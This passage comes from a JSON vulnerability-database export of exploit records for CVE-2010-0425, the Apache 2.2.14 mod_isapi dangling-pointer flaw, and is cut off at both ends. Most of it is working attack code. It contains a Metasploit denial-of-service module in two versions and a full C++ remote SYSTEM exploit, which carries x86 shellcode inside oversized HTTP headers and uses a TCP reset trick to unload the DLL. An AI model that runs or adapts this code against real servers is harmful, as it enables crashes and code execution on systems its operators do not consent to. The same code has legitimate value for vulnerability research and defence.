Ltd 2010.\\n&quot;);\r\n}\r\n\r\n//Setup the server\r\nint createConnection(string serverIP, int port)\r\n{\r\n\tint result = 0, len = 0;\r\n\r\n\tsockVersion = MAKEWORD(1,1);\r\n\tWSAStartup(sockVersion, &amp;wsaData);\r\n\t\r\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)\r\n\t{\r\n\t\tperror(&quot;error: socket()\\n&quot;);\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\trserver.sin_family = AF_INET;\r\n\trserver.sin_port = htons(port);\r\n\trserver.sin_addr.s_addr = inet_addr(serverIP.c_str());\r\n\tmemset(&amp;rserver.sin_zero, 0, 8);\r\n\r\n\tlen = sizeof(struct sockaddr_in);\r\n\t\r\n\tif ((connect(sock, (struct sockaddr *)&amp;rserver, sizeof(struct sockaddr_in))) == -1)\r\n\t{\r\n\t\tperror(&quot;error: connect()\\n&quot;);\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Send a message\r\nint sendTransmission(string message)\r\n{\r\n\tint bytes_sent = 0;\r\n\r\n\tbytes_sent = send(sock, message.c_str(), message.length(), 0);\r\n\tif (bytes_sent &lt; 0)\r\n\t{\r\n\t\tperror(&quot;error: send()\\n&quot;);\r\n\t\texit(1);\r\n\t}\r\n\t\r\n\treturn bytes_sent;\r\n}\r\n\r\n//Receive a message\r\nstring recvTransmission()\r\n{\r\n\tstring result;\r\n\tchar *c = new char[1];\r\n\tint bytes_recv = 0;\r\n\r\n\twhile (c[0] != NULL)\r\n\t{\r\n\t\tbytes_recv = recv(sock, c, 1, 0);\r\n\r\n\t\tif (bytes_recv &lt; 0)\r\n\t\t{\r\n\t\t\tperror(&quot;error: recv()\\n&quot;);\r\n\t\t\t//exit(1);\r\n\t\t}\r\n\r\n\t\tresult += c[0];\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Clean up the connection\r\nvoid cleanUp()\r\n{\r\n\tclosesocket(sock);\r\n\tWSACleanup();\r\n}\r\n\r\n\r\n\r\n====================================================\r\n##\r\n# $Id: apache_mod_isapi.rb 8752 2010-03-08 23:21:17Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 &lt; Msf::Auxiliary\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\tinclude Msf::Auxiliary::Dos\r\n\t\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\t\r\n\t\t\t'Name'           =&gt; 'Apache mod_isapi &lt;= 2.2.14 Dangling Pointer',\r\n\t\t\t'Description'    =&gt; %q{\r\n\t\t\t\t\tThis module triggers a use-after-free vulnerability in the Apache Software\r\n\t\t\t\tFoundation mod_isapi extension. In order to reach the vulnerable code, the \r\n\t\t\t\ttarget server must have an ISAPI module installed and configured.\r\n\r\n\t\t\t\tBy making a request that terminates abnormally (either an aborted TCP connection or\r\n\t\t\t\tan unsatisfied chunked request), mod_isapi will unload the ISAPI extension. Later,\r\n\t\t\t\tif another request comes for that ISAPI module, previously obtained pointers will \r\n\t\t\t\tbe used resulting in an access violation or potentially arbitrary code execution.\r\n\r\n\t\t\t\tAlthough arbitrary code execution is theoretically possible, a real-world method of \r\n\t\t\t\tinvoking this consequence has not been proven. In order to do so, one would need to\r\n\t\t\t\tfind a situation where a particular ISAPI module loads at an image base address\r\n\t\t\t\tthat can be re-allocated by a remote attacker.\r\n\r\n\t\t\t\tLimited success was encountered using two separate ISAPI modules. In this scenario,\r\n\t\t\t\ta second ISAPI module was loaded into the same memory area as the previously \r\n\t\t\t\tunloaded module.\r\n\t\t\t},\r\n\t\t\t'Author'         =&gt; [ 'jduck' ],\r\n\t\t\t'Version'        =&gt; '$Revision: 8752 $',\r\n\t\t\t'License'        =&gt; MSF_LICENSE,\r\n\t\t\t'References'     =&gt;\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2010-0425' ],\r\n\t\t\t\t\t[ 'BID', '38494' ],\r\n\t\t\t\t\t[ 'URL', 'https://issues.apache.org/bugzilla/show_bug.cgi?id=48509' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.gossamer-threads.com/lists/apache/cvs/381537' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.senseofsecurity.com.au/advisories/SOS-10-002' ],\r\n\t\t\t\t\t[ 'URL', 'http://www.exploit-db.com/exploits/11650' ]\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' =&gt; 'Mar 05 2010'))\r\n\r\n\t\tregister_options([\r\n\t\t\tOpt::RPORT(80),\r\n\t\t\tOptString.new('ISAPI', [ true, 'ISAPI URI to request', '/cgi-bin/SMTPSend.dll' ])\r\n\t\t])\r\n\tend\r\n\r\n\tdef run\r\n\r\n\t\tserverIP = datastore['RHOST']\r\n\t\tif (datastore['RPORT'] != 80)\r\n\t\t\tserverIP += &quot;:&quot; + datastore['RPORT']\r\n\t\tend\r\n\t\tisapiURI = datastore['ISAPI']\r\n\r\n\t\t# Create a stale pointer using the vulnerability\r\n\t\tprint_status(&quot;Causing the ISAPI dll to be loaded and unloaded...&quot;)\r\n\t\tunload_trigger = &quot;POST &quot; + isapiURI + &quot; HTTP/1.0\\r\\n&quot; +\r\n\t\t\t&quot;Pragma: no-cache\\r\\n&quot; +\r\n\t\t\t&quot;Proxy-Connection: Keep-Alive\\r\\n&quot; +\r\n\t\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot; +\r\n\t\t\t&quot;Transfer-Encoding: chunked\\r\\n&quot; +\r\n\t\t\t&quot;Content-Length: 40334\\r\\n\\r\\n&quot; +\r\n\t\t\tRex::Text.rand_text_alphanumeric(rand(128)+128)\r\n\t\tconnect\r\n\t\tsock.put(unload_trigger)\r\n\t\tdisconnect\r\n\r\n\t\t# Now make the stale pointer get used...\r\n\t\tprint_status(&quot;Triggering the crash ...&quot;)\r\n\t\tdata = Rex::Text.rand_text_alphanumeric(rand(256)+1337)\r\n\t\tcrash_trigger = &quot;POST &quot; + isapiURI + &quot; HTTP/1.0\\r\\n&quot; +\r\n\t\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot; +\r\n\t\t\t&quot;Content-Length: #{data.length}\\r\\n\\r\\n&quot; +\r\n\t\t\tdata\r\n\r\n\t\tconnect\r\n\t\tsock.put(crash_trigger)\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend\r\n\n                              ",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:19282"
        },
        {
            "bulletinFamily": "exploit",
            "description": "This module triggers a use-after-free vulnerability in the Apache Software Foundation mod_isapi extension for versions 2.2.14 and earlier. In order to reach the vulnerable code, the target server must have an ISAPI module installed and configured. By making a request that terminates abnormally (either an aborted TCP connection or an unsatisfied chunked request), mod_isapi will unload the ISAPI extension. Later, if another request comes for that ISAPI module, previously obtained pointers will be used resulting in an access violation or potentially arbitrary code execution. Although arbitrary code execution is theoretically possible, a real-world method of invoking this consequence has not been proven. In order to do so, one would need to find a situation where a particular ISAPI module loads at an image base address that can be re-allocated by a remote attacker. Limited success was encountered using two separate ISAPI modules. In this scenario, a second ISAPI module was loaded into the same memory area as the previously unloaded module.\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2010-03-08T23:21:17",
            "id": "MSF:AUXILIARY/DOS/HTTP/APACHE_MOD_ISAPI",
            "href": "",
            "type": "metasploit",
            "title": "Apache mod_isapi Dangling Pointer",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache mod_isapi Dangling Pointer',\n      'Description'    => %q{\n        This module triggers a use-after-free vulnerability in the Apache\n        Software Foundation mod_isapi extension for versions 2.2.14 and earlier.\n        In order to reach the vulnerable code, the target server must have an\n        ISAPI module installed and configured.\n\n        By making a request that terminates abnormally (either an aborted TCP\n        connection or an unsatisfied chunked request), mod_isapi will unload the\n        ISAPI extension. Later, if another request comes for that ISAPI module,\n        previously obtained pointers will be used resulting in an access\n        violation or potentially arbitrary code execution.\n\n        Although arbitrary code execution is theoretically possible, a\n        real-world method of invoking this consequence has not been proven. In\n        order to do so, one would need to find a situation where a particular\n        ISAPI module loads at an image base address that can be re-allocated by\n        a remote attacker.\n\n        Limited success was encountered using two separate ISAPI modules. In\n        this scenario, a second ISAPI module was loaded into the same memory\n        area as the previously unloaded module.\n      },\n      'Author'         =>\n        [\n          'Brett Gervasoni',  # original discovery\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0425' ],\n          [ 'OSVDB', '62674'],\n          [ 'BID', '38494' ],\n          [ 'URL', 'https://issues.apache.org/bugzilla/show_bug.cgi?id=48509' ],\n          [ 'URL', 'http://www.gossamer-threads.com/lists/apache/cvs/381537' ],\n          [ 'URL', 'http://www.senseofsecurity.com.au/advisories/SOS-10-002' ],\n          [ 'EDB', '11650' ]\n        ],\n      'DisclosureDate' => 'Mar 05 2010'))\n\n    register_options([\n      Opt::RPORT(80),\n      OptString.new('ISAPI', [ true, 'ISAPI URI to request', '/cgi-bin/SMTPSend.dll' ])\n    ])\n  end\n\n  def run\n\n    serverIP = datastore['RHOST']\n    if (datastore['RPORT'].to_i != 80)\n      serverIP += \":\" + datastore['RPORT'].to_s\n    end\n    isapiURI = datastore['ISAPI']\n\n    # Create a stale pointer using the vulnerability\n    print_status(\"Causing the ISAPI dll to be loaded and unloaded...\")\n    unload_trigger = \"POST \" + isapiURI + \" HTTP/1.0\\r\\n\" +\n      \"Pragma: no-cache\\r\\n\" +\n      \"Proxy-Connection: Keep-Alive\\r\\n\" +\n      \"Host: \" + serverIP + \"\\r\\n\" +\n      \"Transfer-Encoding: chunked\\r\\n\" +\n      \"Content-Length: 40334\\r\\n\\r\\n\" +\n      Rex::Text.rand_text_alphanumeric(rand(128)+128)\n    connect\n    sock.put(unload_trigger)\n    disconnect\n\n    # Now make the stale pointer get used...\n    print_status(\"Triggering the crash ...\")\n    data = Rex::Text.rand_text_alphanumeric(rand(256)+1337)\n    crash_trigger = \"POST \" + isapiURI + \" HTTP/1.0\\r\\n\" +\n      \"Host: \" + serverIP + \"\\r\\n\" +\n      \"Content-Length: #{data.length}\\r\\n\\r\\n\" +\n      data\n\n    connect\n    sock.put(crash_trigger)\n    disconnect\n\n  end\nend\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/APACHE_MOD_ISAPI"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit. CVE-2010-0425. Remote exploit for windows platform",
            "modified": "2010-03-07T00:00:00",
            "published": "2010-03-07T00:00:00",
            "id": "EDB-ID:11650",
            "href": "https://www.exploit-db.com/exploits/11650/",
            "type": "exploitdb",
            "title": "Apache 2.2.14 mod_isapi - Dangling Pointer Remote SYSTEM Exploit",
            "sourceData": "/*\r\n * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)\r\n * ------------------------------------------------------------------------------\r\n *\r\n * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002\r\n * \r\n * Description:\r\n * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.\r\n * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential \r\n * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module). Do not test\r\n * this code in a VM otherwise the code may fail to send the RESET packet (something to do with\r\n * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want\r\n * to have to use raw packets on Windows. \r\n *\r\n * Shellcode Note: \r\n * The shellcode writes \"pwn-isapi\" to \"sos.txt\" which is created in the current working directory. \r\n * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding\r\n * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base \r\n * address of msvcrt.dll instead. I've also added another check so that it will be able to detect\r\n * \"msvcrt.dll\" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this\r\n * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of \r\n * msvcrt.dll. So the added check will verify the presents of \"m\" before proceeding. \r\n *\r\n * Author: \r\n * Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n *\r\n * Copyright Sense of Security Pty Ltd 2010. \r\n * http://www.senseofsecurity.com.au\r\n */\r\n\r\n#include <iostream>\r\n#include <windows.h>\r\n#include <winsock.h>\r\n#include <string>\r\n#include <direct.h>\r\n\r\n#pragma comment(lib, \"wsock32.lib\")\r\n\r\nusing namespace std;\r\n\r\n#define SERVER_PORT 80\r\n\r\nvoid header();\r\nint createConnection(string targetAddr, int targetPort);\r\nint sendTransmission(string message);\r\nstring recvTransmission();\r\nvoid cleanUp();\r\n\r\nWORD sockVersion;\r\nWSADATA wsaData;\r\n\r\nint sock;\r\nstruct sockaddr_in rserver;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tstring serverIP, isapiDLL;\r\n\tstring triggerVuln, payload;\r\n\tchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];\r\n\r\n\t//custom shellcode that writes \"pwn-isapi\" to \"sos.txt\" in the current working directory\r\n\t//Note: There are four NOPs at the end for padding. Not really needed. \r\n\tchar shellcode[] = \"\\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b\"\r\n\t\t\t\t\t   \"\\x7e\\x20\\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94\"\r\n\t\t\t\t\t   \"\\x6c\\x66\\x39\\x0f\\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24\"\r\n\t\t\t\t\t   \"\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\"\r\n\t\t\t\t\t   \"\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\"\r\n\t\t\t\t\t   \"\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\"\r\n\t\t\t\t\t   \"\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\"\r\n\t\t\t\t\t   \"\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\\x0c\\x01\\x66\\x81\"\r\n\t\t\t\t\t   \"\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\\xde\\xc3\"\r\n\t\t\t\t\t   \"\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b\"\r\n\t\t\t\t\t   \"\\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31\"\r\n\t\t\t\t\t   \"\\xd2\\x58\\x88\\x50\\x07\\xeb\\x2f\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2e\\x51\\x50\\xff\"\r\n\t\t\t\t\t   \"\\x55\\x04\\xeb\\x2c\\x31\\xd2\\x59\\x88\\x51\\x09\\xeb\\x33\\x51\\x50\\x89\\xc6\\xff\\x55\"\r\n\t\t\t\t\t   \"\\x08\\x53\\xff\\x55\\x0c\\xe8\\xd1\\xff\\xff\\xff\\x73\\x6f\\x73\\x2e\\x74\\x78\\x74\\x4e\"\r\n\t\t\t\t\t   \"\\xe8\\xcc\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcd\\xff\\xff\\xff\\xe8\\xcf\\xff\\xff\\xff\\x70\"\r\n\t\t\t\t\t   \"\\x77\\x6e\\x2d\\x69\\x73\\x61\\x70\\x69\\x4e\\xe8\\xc8\\xff\\xff\\xff\\x90\\x90\\x90\\x90\";\r\n\r\n\theader();\r\n\r\n\tif (argc < 3)\r\n\t{\r\n\t\tprintf(\"usage: %s <ip> <DLL>\\n\", argv[0]);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tserverIP = string(argv[1]);\r\n\tisapiDLL = string(argv[2]);\r\n\r\n\t//all these values could be set to 7601 + sizeof(shellcode)\r\n\t//but mixing it up is good. \r\n\tmemset(accept, 'A', 170);\r\n\tmemset(referer, 'A', 732);\r\n\tmemset(cookie, 'A', 5375);\r\n\tmemset(random, 'A', 7603);\r\n\tmemset(postData, 'A', 23378);\r\n\tmemset(footer, 'A', 298);\r\n\r\n\ttriggerVuln = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"\r\n\t\t\"User-Agent: AAAAAAAA\\r\\n\"\r\n\t\t\"Pragma: no-cache\\r\\n\"\r\n\t\t\"Proxy-Connection: Keep-Alive\\r\\n\"\r\n\t\t\"Host: \" + serverIP + \"\\r\\n\"\r\n\t\t\"Content-Length: 40334\\r\\n\\r\\n\" +\r\n\t\tstring(footer);\r\n\r\n\t//Modify the below request if needed (depending on where your function pointer is pointing)\r\n\t//Do so by adding or removing headers. So if you want to hit a higher function pointer, \r\n\t//keep adding headers :) \r\n\t//Note: If performing this blindly, try it a few times, change a bit, try again. \r\n\t//During testing i found that using a chunk of data the same size with the same header name\r\n\t//was more unreliable. In memory, large amounts of nulls are being placed either side of the \r\n\t//payload. Since the function pointer address was random, by slightly mixing up the size of \r\n\t//each header i would get better results.\r\n\tpayload = \"POST /cgi-bin/\" + isapiDLL + \" HTTP/1.0\\r\\n\"\r\n\t\t\"Accept: \" + string(accept) + \"\\r\\n\"\r\n\t\t\"Referer: \" + string(referer) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"From: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Utruvh-guiergher: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\"\r\n\t\t\"Cookie: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Host: \" + serverIP + \"\\r\\n\"\r\n\t\t\"Proxy-Connection: Keep-Alive\\r\\n\"\r\n\t\t\"Okytuasd: \" + string(cookie) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Asdasdasdasdasd: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Asdasda: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Sewrwefbui: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Qdfasdernu: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Cdffew-asdf: \" + string(random) + string(shellcode) + \"\\r\\n\"\r\n\t\t\"Kuiytnb-Ehrf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Lsfergjnuibubiu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Baefrwerifnhu: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Zdsfno: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Psdfsafn: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Zefwefnuivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Ivre-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yvasde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yuionbsdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Yasdasdasdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"asdasdde-sdf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Ertuioert-erf: \" + string(cookie) + string(shellcode) + \"BBBB\" + \"\\r\\n\"\r\n\t\t\"Content-Length: 25054\\r\\n\\r\\n\" + \r\n\t\tstring(postData) + \"CCCC\" + string(shellcode) + \"BBBB\" + string(footer);\r\n\r\n\t//Setup connection\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(\"- an error occurred connecting to the server\\n\");\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tprintf(\"[+] Connected to %s.\\n\", serverIP.c_str());\r\n\r\n\tprintf(\"[+] Setting socket data structure values\\n\");\r\n\tint iOptVal;\r\n\tint aiOptVal;\r\n\t\r\n\tstruct linger linger_data;\r\n\t\r\n\t//This is meant to set closesocket to do a \"graceful close\",\r\n\t//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is \r\n\t//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent. \r\n\tlinger_data.l_onoff = 0;\r\n\tlinger_data.l_linger = 0;\r\n\r\n\tsetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, sizeof(linger_data));\r\n\tsetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, sizeof(linger_data));\r\n\r\n\t//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent\r\n\tgetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, &iOptVal);\r\n\tgetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, &aiOptVal);\r\n\tprintf(\"    - SO_LINGER value is set to %ld\\n\", linger_data.l_onoff);\r\n\tprintf(\"    - SO_DONTLINGER value is set to %ld\\n\", linger_data.l_linger);\r\n\t\r\n\tprintf(\"[*] Triggering DLL unload\\n\");\r\n\tsendTransmission(triggerVuln);\r\n\r\n\tSleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent. \r\n\tWSACancelBlockingCall(); //Cause reset packet response\r\n\r\n\tSleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...\r\n\tclosesocket(sock);\r\n\r\n\tSleep(2000);\r\n\tWSACleanup();\r\n\t\r\n\tSleep(2000);\r\n\tprintf(\"[+] The DLL should be unloaded by now\\n\");\r\n\t\r\n\t//Reconnect to deliver payload\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(\"- an error occurred connecting to the server\\n\");\r\n\t\treturn 1;\r\n\t}\r\n\t\r\n\tprintf(\"[*] Sending payload\\n\");\r\n\tsendTransmission(payload);\r\n\r\n\tcleanUp();\r\n\r\n\tprintf(\"[+] Check to see if sos.txt was created...\\n\");\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid header()\r\n{\r\n\tprintf(\"Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\\n\");\r\n\tprintf(\"-------------------------------------------------------------\\n\");\r\n\tprintf(\"         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\\n\");\r\n\tprintf(\"                    Copyright Sense of Security Pty Ltd 2010.\\n\");\r\n}\r\n\r\n//Setup the server\r\nint createConnection(string serverIP, int port)\r\n{\r\n\tint result = 0, len = 0;\r\n\r\n\tsockVersion = MAKEWORD(1,1);\r\n\tWSAStartup(sockVersion, &wsaData);\r\n\t\r\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)\r\n\t{\r\n\t\tperror(\"error: socket()\\n\");\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\trserver.sin_family = AF_INET;\r\n\trserver.sin_port = htons(port);\r\n\trserver.sin_addr.s_addr = inet_addr(serverIP.c_str());\r\n\tmemset(&rserver.sin_zero, 0, 8);\r\n\r\n\tlen = sizeof(struct sockaddr_in);\r\n\t\r\n\tif ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1)\r\n\t{\r\n\t\tperror(\"error: connect()\\n\");\r\n\t\tresult = 1;\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Send a message\r\nint sendTransmission(string message)\r\n{\r\n\tint bytes_sent = 0;\r\n\r\n\tbytes_sent = send(sock, message.c_str(), message.length(), 0);\r\n\tif (bytes_sent < 0)\r\n\t{\r\n\t\tperror(\"error: send()\\n\");\r\n\t\texit(1);\r\n\t}\r\n\t\r\n\treturn bytes_sent;\r\n}\r\n\r\n//Receive a message\r\nstring recvTransmission()\r\n{\r\n\tstring result;\r\n\tchar *c = new char[1];\r\n\tint bytes_recv = 0;\r\n\r\n\twhile (c[0] != NULL)\r\n\t{\r\n\t\tbytes_recv = recv(sock, c, 1, 0);\r\n\r\n\t\tif (bytes_recv < 0)\r\n\t\t{\r\n\t\t\tperror(\"error: recv()\\n\");\r\n\t\t\t//exit(1);\r\n\t\t}\r\n\r\n\t\tresult += c[0];\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\n//Clean up the connection\r\nvoid cleanUp()\r\n{\r\n\tclosesocket(sock);\r\n\tWSACleanup();\r\n}\r\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:11650"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2010-03-07T00:00:00",
            "published": "2010-03-07T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-19236",
            "id": "SSV:19236",
            "title": "Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit",
            "type": "seebug",
            "sourceData": "\n                                                /*\r\n * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)\r\n * ------------------------------------------------------------------------------\r\n *\r\n * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002\r\n * \r\n * Description:\r\n * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.\r\n * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential \r\n * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module). Do not test\r\n * this code in a VM otherwise the code may fail to send the RESET packet (something to do with\r\n * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want\r\n * to have to use raw packets on Windows. \r\n *\r\n * Shellcode Note: \r\n * The shellcode writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; which is created in the current working directory. \r\n * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding\r\n * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base \r\n * address of msvcrt.dll instead. I've also added another check so that it will be able to detect\r\n * &quot;msvcrt.dll&quot; on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this\r\n * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of \r\n * msvcrt.dll. So the added check will verify the presents of &quot;m&quot; before proceeding. \r\n *\r\n * Author: \r\n * Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n *\r\n * Copyright Sense of Security Pty Ltd 2010. \r\n * 